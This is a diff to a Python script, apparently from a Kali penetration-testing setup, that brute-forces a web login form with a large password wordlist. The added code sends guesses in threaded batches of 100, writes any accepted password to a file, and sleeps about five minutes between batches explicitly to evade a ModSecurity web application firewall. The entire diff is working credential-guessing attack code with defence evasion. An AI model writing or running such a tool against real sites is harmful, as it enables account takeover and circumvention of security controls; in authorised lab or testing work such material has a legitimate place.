@@ -1,8 +1,11 @@
+from asyncio import futures
 import requests
 import aiohttp
 import asyncio
 import concurrent
 from concurrent.futures import ThreadPoolExecutor
+import time
+from datetime import datetime
 
 def get_post_data(password):
     data = {
@@ -56,33 +59,40 @@ if __name__ == "__main__":
     with open('/home/kali/wordlists/passwords-large.txt', encoding = 'utf-8') as passwords_file:
         for line in passwords_file.readlines():
             password_list.append(line.rstrip())
-    
-    print(len(password_list))
-    print(password_list[0])
+
+
     # asyncio.run(
     #     main(password_list=password_list[0:10], bruteforce_url=bruteforce_url,
     #     headers=headers, cookies=cookies)
     # )
+    start_index = 500
     step = 100
     with ThreadPoolExecutor(max_workers=threads) as executor:
-        future_to_url = {
-            executor.submit(guess_password, bruteforce_url, get_post_data(password), headers, cookies)
-            for password in password_list[400:402] 
-        }
-        for batch in range(400, len(password_list), step):
-            print(f'Batch start: {batch}')
+        for batch in range(start_index, len(password_list), step):
+            print(f"batch {batch} started @ {datetime.now().strftime('%H:%M:%S')}")
+            future_to_url = {
+                executor.submit(guess_password, bruteforce_url, get_post_data(password), headers, cookies)
+                for password in password_list[batch:batch+step] 
+            }
 
-        print(type(future_to_url), len(password_list))
-        completed_futures = enumerate(concurrent.futures.as_completed(future_to_url))
-        for index, future in completed_futures:
-            try:
-                response = future.result()
-                if response.status_code == 200 :
-                    if response.text.find('incorrect') > -1:
-                        print(f'request {index}: {response.status_code} but incorrect password')
-                    else:
-                        print(f'request {index}: {response.status} with correct password! Password: {response.request.data["pwd"]}') 
-                elif response.status_code == 406:
-                    print(f'request {index}: {response.status_code}, probably a timeout')
-            except Exception as e:
-                print('Looks like something went wrong:', e)
+            completed_futures = enumerate(concurrent.futures.as_completed(future_to_url))
+            for index, future in completed_futures:
+                index += start_index
+                try:
+                    response = future.result()
+                    if response.status_code == 200 :
+                        if response.text.find('incorrect') > -1:
+                            print(f'request {index}: {response.status_code} but incorrect password')
+                        else:
+                            print(f'request {index}: {response.status} with correct password! Password: {response.request.data["pwd"]}') 
+                            with open('./thepassword.txt', 'w+') as thepassword_file:
+                                thepassword_file.write(response.request.data["pwd"])
+                    elif response.status_code == 406:
+                        print(f'request {index}: {response.status_code}, probably a timeout')
+                except Exception as e:
+                    print('Looks like something went wrong:', e)
+            
+            # sleep for 5 minutes after executing a batch of [step] concurrent requests
+            print(f"batch {batch} ended @ {datetime.now().strftime('%H:%M:%S')}")
+            print("WAITING for ~ 5 MINTUES BECAUSE OF THE MOD_SECURITY WAF")
+            time.sleep(60*5+2)
